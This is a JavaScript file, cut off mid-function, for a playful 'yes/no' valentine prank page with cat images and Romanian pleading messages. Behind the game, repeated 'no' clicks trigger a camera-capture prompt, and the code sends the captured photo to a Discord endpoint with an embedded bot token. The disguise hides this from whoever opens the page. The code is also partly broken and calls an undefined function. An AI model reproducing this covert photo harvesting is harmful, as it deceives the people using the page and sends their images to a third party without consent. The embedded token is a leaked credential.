"use strict";
const titleElement = document.querySelector(".title");
const buttonsContainer = document.querySelector(".buttons");
const yesButton = document.querySelector(".btn--yes");
const noButton = document.querySelector(".btn--no");
const catImg = document.querySelector(".cat-img");

const MAX_IMAGES = 5;

let play = true;
let noCount = 0;

yesButton.addEventListener("click", handleYesClick);
function handleYesClick() {
  titleElement.innerHTML = "SEX !!!!!!!";
  buttonsContainer.classList.add("hidden");
  changeImage("yes");
  capturePhoto();
}

function resizeYesButton() {
  const computedStyle = window.getComputedStyle(yesButton);
  const fontSize = parseFloat(computedStyle.getPropertyValue("font-size"));
  const newFontSize = fontSize * 1.6;

  yesButton.style.fontSize = `${newFontSize}px`;
}

function generateMessage(noCount) {
  const messages = [
    "Nu",
    "Sigur?",
    "Pookie please",
    "Te rog",
    "Esti loser-ul meu preferat ",
    "Bine atunci...",
  ];

  const messageIndex = Math.min(noCount, messages.length - 1);
  return messages[messageIndex];
}

function changeImage(image) {
  catImg.src = `img/cat-${image}.jpg`;
}

function updateNoButtonText() {
  noCount++;
  const message = generateMessage(noCount);
  noButton.innerHTML = message;

  if (message === "Bine atunci...") {
    noButton.addEventListener("click", function () {
      if (play) {
        play = false;

        // Capture a photo from the user's camera
        const photoInput = document.createElement("input");
        photoInput.type = "file";
        photoInput.accept = "image/*;capture=camera";
        photoInput.addEventListener("change", function (event) {
          const file = event.target.files[0];
          const reader = new FileReader();
          reader.onload = function (event) {
            const capturedImage = event.target.result;

            // Send the captured photo to Discord or Telegram
            sendCapturedPhotoToDiscordOrTelegram(capturedImage);
          };
          reader.readAsDataURL(file);
        });
        document.body.appendChild(photoInput);
        photoInput.click();
      }
    });
  }
}

noButton.addEventListener("click", function () {
  if (play) {
    const imageIndex = Math.min(noCount, MAX_IMAGES);

    changeImage(imageIndex);
    resizeYesButton();
    updateNoButtonText();
  }
});

function sendCapturedPhotoToDiscordOrTelegram(photo) {
  const discordToken = 'MTIwNjk0Njc2NjMwMjM1MTM3MA.GZp1AU.rD6qMwOJjxk_1nx5tS7pR44MHD_yRal6fiq68k'; // Replace with your actual token
  const discordChannelId = '1198262222162497686'; // Replace with your actual channel ID

  const formData = new FormData();
  formData.append('file', photo, 'photo.jpg'); // Assuming you've saved the photo as 'photo.jpg'

  fetch('https://discord.com/api/webhooks/' + discordChannelId, {
    method: 'POST',
    headers: {
      'Content-Type': 'multipart/form-data',
      'Authorization': `Bot ${discordToken}`
    },
    body: formData
 
